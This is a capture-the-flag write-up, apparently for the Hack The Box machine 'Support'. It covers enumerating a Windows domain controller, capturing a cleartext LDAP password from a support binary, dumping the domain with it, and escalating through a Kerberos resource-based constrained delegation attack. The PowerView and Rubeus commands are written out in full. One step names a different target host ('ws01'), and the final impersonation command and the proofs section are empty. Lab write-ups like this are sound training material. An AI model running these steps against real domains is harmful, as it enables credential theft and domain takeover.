---
description: 10-22-22
---

# Support (Easy)

<figure><img src="../../../.gitbook/assets/image (8) (1) (2).png" alt=""><figcaption></figcaption></figure>

## Information Gathering

Scanned all TCP ports:

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-10-22 19:59:08Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -3s
| smb2-time: 
|   date: 2022-10-22T19:59:13
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

PORT      STATE SERVICE    VERSION
5985/tcp  open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf     .NET Message Framing
49664/tcp open  msrpc      Microsoft Windows RPC
49668/tcp open  msrpc      Microsoft Windows RPC
49676/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc      Microsoft Windows RPC
49695/tcp open  msrpc      Microsoft Windows RPC
49711/tcp open  msrpc      Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

Enumerated UDP ports:

<pre><code>PORT    STATE SERVICE VERSION
53/udp  open  domain  (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   NBTStat: 
|_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
<strong>| 123/udp open  ntp     NTP v3</strong></code></pre>

Notes:

* 53/DNS -- DNS Zone Transfer Failed -- support.htb -- TXT record: <mark style="color:yellow;">dc.support.htb hostmaster.support.htb</mark>
* 88/Kerberos -- <mark style="color:yellow;">Can we enumerate users and try AS-REPRoasting or Kerberoasting</mark>
* 445/SMB -- <mark style="color:yellow;">SMBMAP and SMBCLIENT</mark>
* 3268/LDAP -- <mark style="color:yellow;">Ldap enumeration -- JXplorer?</mark>
* 5985/WinRM -- If we have valid creds, we will be able to WinRM
* 123/udp NTP -- <mark style="color:yellow;">NTP v3</mark>???

## Enumeration

### Port 53 - DNS&#x20;

* Zone Transfer Attempted -- FAILED
  * /etc/hosts -- <mark style="color:yellow;">support.htb</mark>

Dig:

<pre><code><strong>dig axfr 10.129.92.248
</strong>
dig axfr support.htb</code></pre>

Dig TXT Query:

```
dig TXT @10.129.92.248 support.htb

; <<>> DiG 9.18.7-1-Debian <<>> TXT @10.129.92.248 support.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 16728
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;support.htb.                   IN      TXT

;; AUTHORITY SECTION:
support.htb.            3600    IN      SOA     dc.support.htb. hostmaster.support.htb. 133 900 600 86400 3600

```

Two new subdomains?

* <mark style="color:yellow;">dc.support.htb</mark>
* <mark style="color:yellow;">hostmaster.support.htb</mark>
* Added to /etc/hosts

I can also achieve the same with:

```
dig @10.129.92.248 +short support.htb any

10.129.92.248
dc.support.htb.
dc.support.htb. hostmaster.support.htb. 134 900 600 86400 3600
```

dnsrecon:

```
dnsrecon -d support.htb

dnsrecon -d dc.support.htb

dnsrecon -d hostmaster.support.htb
```

### Port 88 - Kerberos

* Perform user enumeration
* Valid user = Attempt ASREProasting (Kerberos Preauthentication is disabled)
* Valid Credentials = Attampt Kerberoasting (Weak/insecure passwords -- directly exploiting the nature of Kerberos)

### 445 - SMB&#x20;

Map out shares with **smbmap (Null User):**

```
smbmap -H 10.129.92.248
[+] IP: 10.129.92.248:445       Name: support.htb
```

* We confirmed that we have access as a null user

List out shares with **smbclient:**

```
smbclient --no-pass -L //10.129.92.248

Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share
```

* \-L will list out the shares
* We notice <mark style="color:yellow;">support-tools</mark> -- This is not a standard share and is definitely something that we want to check out.
* Support staff tools

Getting an SMB session:&#x20;

```
smbclient --no-pass //10.129.92.248/support-tools

Try "help" to get a list of possible commands.
smb: \>
```

Enumerating Share:

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

* <mark style="color:yellow;">UserInfo</mark> looks the most interesting

Found something in UserInfo.exe:

* <mark style="color:yellow;">$5a280d0b-9fd0-4701-8f96-82e2f1ea9dfb</mark>

Found a public key token in UserInfo.exe.config:

* <mark style="color:yellow;">publicKeyToken="b03f5f7f11d50a3a"</mark>

Found interesting strings in <mark style="color:yellow;">System.Runtime.CompilerServices.Unsafe.dll</mark>

* Some strings resembled passwords

It appears that the support team is using an outdated version of Notepad++ version 3 (came out in 2007)

## Exploitation - Suspicious Binary

### UserInfo.exe

* This file really boggled my mind for quite some time
* I attempted to run some forensics tools on it to inspect it for anything weird
* This file originally stood out to me because it does not appear to be anything that I have seen before
* After some trial and error, I transferred the binary to my Windows VM and began to look at it on the OS that it was made for -- Windows&#x20;

Dynamic Analysis of UserInfo.exe:

* I first tried to run the program, nothing happened
* I then did some research on tools that aid in conducting dynamic analysis

Sysinternals:

* I ran tools such as TCPview and procmon to see if there was anything interesting happening in the background during runtime

DNSPY:

* Loaded UserInfo.exe into DNSPY

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

* It appears that the binary is making a cleartext LDAP query over the network to determine User information!
* However, the password is clearly encrypted
* If the transmission is occuring in clear text, could we capture the password in flight with a packet capture utility?

Ldap Query:

<figure><img src="../../../.gitbook/assets/image (5) (6).png" alt=""><figcaption></figcaption></figure>

Wireshark:

* I made sure to run this in my Kali VM as I will need access to my VPN to hit the target
* I made a specific filter for LDAP traffic only

MONO:

The command that worked for me to install is:

```
sudo apt-get install mono-complete
```

We can now run UserInfo.exe on kali:

Displaying Help:

<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

Getting user information on my name:

<figure><img src="../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

* Now, let's run the same command and pay attention to wireshark

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

* Time to dive into these packets
* If we right-click the first packet and follow the TCP stream, we can dive deeper

Following TCP Stream on Wireshark from LDAP traffic (from UserInfo.exe):

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

* This is the cleartext request!

ldap: <mark style="color:yellow;">support\ldap</mark>

Password: <mark style="color:yellow;">nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</mark>

### LDAP Enumeration

* We should now be able to authenticate against LDAP and dump domain information

<mark style="color:yellow;">LDAPDOMAINDUMP:</mark>

```
ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb
```

* You will then get an entire dump of the domain through LDAP
* I then decided to cat out the <mark style="color:yellow;">domain\_users.json</mark>&#x20;
* Going through it, I came across a potential password in the info

<figure><img src="../../../.gitbook/assets/image (3) (1) (2).png" alt=""><figcaption></figcaption></figure>

* The CN is support (user)
* 5985 is open, so let's try to Evil-WinRM in

### Evil-WinRM

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* We have success!

## Privilege Escalation

### Local enumeration

Establishing SMB Server for easy file transfer:

```
impacket-smbserver smb . -smb2support
```

<figure><img src="../../../.gitbook/assets/image (4) (1) (3).png" alt=""><figcaption></figcaption></figure>

Transferring files to aid in enumeration:

<figure><img src="../../../.gitbook/assets/image (2) (1) (3).png" alt=""><figcaption></figcaption></figure>

adPEAS:

```
ipmo adPEAS.ps1
Invoke-asPEAS
```

BloodHound:

* I made sure to mark support as owned

Query- Shortest Paths to High Value Targets:&#x20;

<figure><img src="../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

Query- Shortest Path to Domain Admin:

<figure><img src="../../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

### **Exploitation Path**

* We already see that support has "<mark style="color:yellow;">GenericAll</mark>" permission over the AD-Object dc.support.HTB
* Since we have this permission on the AD object, we can execute <mark style="color:yellow;">Kerberos Resource-Based Constrained Delegation</mark>

Definition:

It's possible to gain code execution with elevated privileges on a remote computer if you have WRITE privilege on that computer's AD object.

PowerView:

Import PowerView:

```
ipmo .\PowerView
```

Rubeus:

* Transfer Rubeus over to the Target machine

### Kerberos Resource-Based Constrained Delegation

Steps:

1. Create a new computer object

```
New-MachineAccount -MachineAccount fakehaha1 -Password $(ConvertTo-SecureString 'Password1' -AsPlainText -Force) -Verbose
```

&#x20;2\. Checking if the computer was created and obtaining SID:

```
Get-DomainComputer fakehaha1
```

SID: <mark style="color:yellow;">S-1-5-21-1677581083-3380853377-188903654-5602</mark>

&#x20;3\. Create a new security desciptor for the fakehaha1 computer principal:

```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5602)"

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)
```

&#x20;4\. Now, we need to modify the target computer's AD object:

```
Get-DomainComputer ws01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

&#x20;5\. Now, we can generate the RC4 hash using Rubeus:

```
.\Rubeus.exe hash /password:Password1 /user:fakehaha1 /domain:support.htb
```

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

* It is labeled rc4\_hmac: <mark style="color:yellow;">64F12CDDAA88057E06A81B54E73B949B</mark>

&#x20;6\. Impersonation- Now that we have the hash, we can now attempt to execute the attack by requesting a Kerberos ticket for fakehaha1 with ability to impersonate Administrator:

```
.\Rubeus.exe 
```

## Proofs
